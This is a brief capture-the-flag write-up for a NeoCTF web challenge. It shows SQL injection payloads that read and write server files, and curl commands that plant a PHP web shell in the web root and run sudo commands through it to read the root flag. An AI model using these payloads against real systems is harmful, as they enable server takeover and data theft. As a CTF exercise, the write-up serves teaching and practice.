A hint from the NeoCTF team on their twitter said that the database did not contain anything useful, which meant
that the flag was somewhere on the filesystem.

Playing around with the form revealed that we could read and write to files arbitrarily.

If we want to write to a file, all we need to do is inject:
    1' UNION SELECT 'hi' INTO OUTFILE '/path/to/file' --

If we want to read from a file, we would input:
    1' UNION SELECT load_file('/path/to/file') --

It occurred to me later on that I needed to find some way to execute commands on the server, and that I could probably
write to a php file that could run shell commands.

In order to find out where I needed to write the php file to, I looked at one of the default locations for an apache2 config:

    $ curl http://45.55.51.22:8883/ --data "search=1' UNION SELECT load_file('/etc/apache2/sites-enabled/000-default.conf') -- "

    ...
    DocumentRoot /var/www/ecustomers
    ...

Now, any file we write to in /var/www/ecustomers can be requested from the server, so let's do it.

    $ curl http://45.55.51.22:8883/ --data "search=1' UNION SELECT '<?php \$output = shell_exec(\$_GET[''cmd'']); echo \"<pre>\$output</pre>\" ?>' INTO OUTFILE '/var/www/ecustomers/insanee.php' -- "

    $ curl http://45.55.51.22:8883/insanee.php?cmd=sudo%20ls%20/root
        flag.txt
        sys-auto

    $ curl http://45.55.51.22:8883/insanee.php?cmd=sudo%20cat%20/root/flag.txt
        flag{9th_and_ash_is_my_favorite}

flag{9th_and_ash_is_my_favorite}
